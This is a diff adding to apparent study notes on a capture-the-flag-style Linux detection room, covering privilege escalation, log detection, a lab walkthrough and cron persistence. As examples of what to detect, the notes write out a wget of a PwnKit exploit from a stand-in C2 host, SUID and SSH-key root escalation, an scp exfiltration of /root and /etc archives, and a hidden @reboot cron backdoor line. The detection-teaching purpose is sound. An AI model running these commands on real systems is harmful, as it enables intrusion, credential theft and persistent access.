@@ -277,7 +277,108 @@ root@GOAT:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child proc
 
 We specifically focus on the process title **(proctitle)**, as it shows us the commands the attacker executed or **argc**, to see the arguments (commands) one by one.
 
-Lets look at logs where a reverse shell was executed and try to find the IP address of the attacker. 
+# Privilege Escalation
 
-First we will open the audit.log and go through it 
+Most of the time attackers dont actually gain root access straight away, they rather start with a low-privileged account. These accounts are sometimes restricted to a single folder or environment like (/var/www/html) and dont have full access to everything around, making them unable to download and run malware.
+
+This is where **Privilege Escalation** comes in. Privilege Escalation can be done using multiple methods and techniques.
+
+- **uname -a** can be used to see the version of the system and perhaps exploit it if it is outdated and already has a public exploit for it.
+
+-  **find /bin -perm 4000** detects env binary with SUID flag. This can be used to get root access using the SUID vulnerability **/bin/env /bin/bash -p**.
+
+- **ls /etc/ssh** to check for exposed and unprotected **ssh-backup-key** file. The backup key can be used to gain root access without knowing the password.
+  e.g: **ssh root@127.0.0.1 -i ssh-backup-key**.
+
+## Detecting Privilege Escalation
+
+Detecting PE depends on misconfiguration of SUID. There are a huge amount of SUID misconfigurations and software vulnerabilities. In this case we will try to detect the surrounding events in 3 steps: **Discovery**, **Privilege Escalation**, and **Exfiltration** after root access is gained.
+
+Lets go through some commands to check for each step and know if anything suspicious was executed.
+
+**Discovery**
+
+**First detection method**: A spike of discovery commands.
+
+``` bash
+whoami # Return "www-data" user
+
+id; pwd; ls -la; crontab -l # Basic initial Discovery
+
+ps aux | egrep "edr|splunk|elastic" # Security tools for Discovery
+
+uname -r. # Returns an old 4.4 kernel
+```
+
+**Second detection method**: A download to Temp directory.
+
+```bash
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
+
+gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
+
+chmod +x /tmp/pwnkit                                  # Making exploit executable
+
+/tmp/pwnkit                                           # Trying to use the exploit
+```
+
+**Third detection methods**: Data Exfiltration with SCP
+
+``` bash
+whoami                                                # Now returns "root" user
+
+tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
+
+scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
+```
+
+# PE Lab
+
+Lets try to detect a privilege escalation through some logs.
+
+**Q1**: Which command line was used to look for the "pass" keyword in files?
+
+I used grep and filtered for pass, simple as that.
+
+![](greppass.png)
+
+**Q2**: Which command line was used to escalate privileges to root?
+
+Same thing here, i grepped for root and found it straight away.
+
+![](root%202.png)
+
+**Q3**: Looking at the detected .env file, what was the root password?
+
+This question is a little tricky, and im not sure if my way is correct lol. I went through the **/opt/trypingme** directory, as it was accessed by the attacker after gaining initial access and we can see a discovery command **whoami**.
+
+![](opt.png)
+
+So after going there, i changed directories to the /opt directory and found **TWO** files that was clear. 
+
+![](opzies.png)
+
+So I wrote cat then clicked TAB to auto complete and it showed me **.env.local** which was hidden whenever i listed it, and found the answer.
+
+![](pass.png)
+
+Another way to answer this is to run this command in the TryPingMe reverse shell machine attached and get the exact answer.  
+
+![](envTPM.png)
+
+![](pazz.png)
+
+And that was it for privilege escalation !
+
+# Establishing Startup Persistence
+
+Linux servers can run for years without a reboot and are often unaltered and untouched unless a necessary update was needed or if something breaks. This is what attackers rely on to have access but this isnt ALWAYS the case. For a long-term persistence attackers have to install a backdoor, to remain in the system whether it was rebooted or not.
+
+## Cron Persistence
+
+Cron jobs are basically scheduled tasks from Windows, it is the simplest way to run a process on schedule and the most popular method. For instance [APT29](https://attack.mitre.org/groups/G0016/) has a C2 backdoor for both Windows and Linux for their malware [GoldMax](https://attack.mitre.org/software/S0588/).  They ensured it survives reboots by adding a new line to the victim's cron job file located at **/var/spool/cron/USER**. 
+
+``` bash
+@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
+```
 
